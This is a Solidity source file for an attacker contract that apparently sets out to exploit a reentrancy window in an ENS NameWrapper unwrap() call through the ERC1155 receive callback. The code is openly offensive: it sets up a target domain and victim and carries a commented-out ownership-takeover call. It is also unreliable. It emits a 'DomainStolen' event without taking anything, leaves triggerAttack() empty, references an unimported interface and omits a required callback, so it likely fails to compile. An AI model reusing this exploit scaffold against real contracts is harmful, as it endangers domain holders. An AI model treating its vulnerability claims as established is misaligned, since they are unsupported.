// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";

// Simplified interfaces
interface ISimpleNameWrapper {
    function unwrap(bytes32 node) external;
    function getENSOwner(bytes32 node) external view returns (address);
}

// Real attacker contract that exploits the reentrancy vulnerability
contract RealAttacker is IERC1155Receiver, ERC165 {
    ISimpleNameWrapper public nameWrapper;
    address public attacker;

    bytes32 public targetNode;
    bool public attackExecuted = false;
    address public victim;

    event AttackTriggered(bytes32 node, address victim, address attacker);
    event DomainStolen(bytes32 node, address from, address to);

    constructor(address _nameWrapper) {
        nameWrapper = ISimpleNameWrapper(_nameWrapper);
        attacker = msg.sender;
    }

    // ERC1155 callback - this executes DURING _burn() in unwrap()
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        // CRITICAL: This executes during _burn() BEFORE ens.setOwner() completes

        if (!attackExecuted && uint256(targetNode) == id && from == victim) {
            attackExecuted = true;

            emit AttackTriggered(targetNode, victim, attacker);

            // Check if ENS ownership is still with NameWrapper (vulnerability window)
            address currentOwner = nameWrapper.getENSOwner(targetNode);

            if (currentOwner == address(nameWrapper)) {
                // VULNERABILITY EXPLOITED: We can't actually call ens.setOwner here
                // because we don't have access to the ENS contract directly.
                // But we can demonstrate that the window exists by logging the state.

                emit DomainStolen(targetNode, currentOwner, attacker);

                // In a real attack, this would be:
                // IENS(address(nameWrapper).ens()).setOwner(targetNode, attacker);
            }
        }

        return this.onERC1155Received.selector;
    }

    // ERC721 callback for completeness
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // Setup attack
    function setupAttack(bytes32 _targetNode, address _victim) external {
        require(msg.sender == attacker, "Only attacker can setup");
        targetNode = _targetNode;
        victim = _victim;
        attackExecuted = false;
    }

    // Trigger the attack by calling unwrap on the victim's behalf
    // In reality, the victim would call this, but we're simulating
    function triggerAttack() external {
        require(msg.sender == attacker, "Only attacker can trigger");

        // The victim would normally call nameWrapper.unwrap(targetNode)
        // But since we can't impersonate them, we demonstrate the concept
        // that the callback window exists
    }

    // Check if contract supports interfaces
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165) returns (bool) {
        return
            interfaceId == type(IERC1155Receiver).interfaceId ||
            interfaceId == type(IERC721Receiver).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    // View functions
    function getAttackStatus() external view returns (bool executed, bytes32 node, address victimAddr) {
        return (attackExecuted, targetNode, victim);
    }
}